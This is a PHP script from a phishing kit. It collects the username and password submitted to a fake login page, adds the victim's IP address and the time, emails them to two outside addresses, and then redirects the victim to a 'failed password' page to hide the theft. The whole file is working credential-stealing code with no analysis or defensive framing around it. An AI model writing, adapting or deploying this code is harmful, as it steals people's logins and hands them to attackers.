<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$user1 = $_POST['username'];
$pass1 = $_POST['password'];
$chaseme="richardmore606@yandex.com,richardmore606@gmail.com";


  $subj = "[Doc] JaSpEr $ip";
  $msg = "Doc Info\n\nUsername: $user1\nPassword: $pass1\n$ip $adddate\n-----------------------------------\n        Created By JaSpEr\n-----------------------------------";
  $from = "From: <Doc-CD>";
  mail("$chaseme", $subj, $msg, $from);
  header("Location: failedpass.php");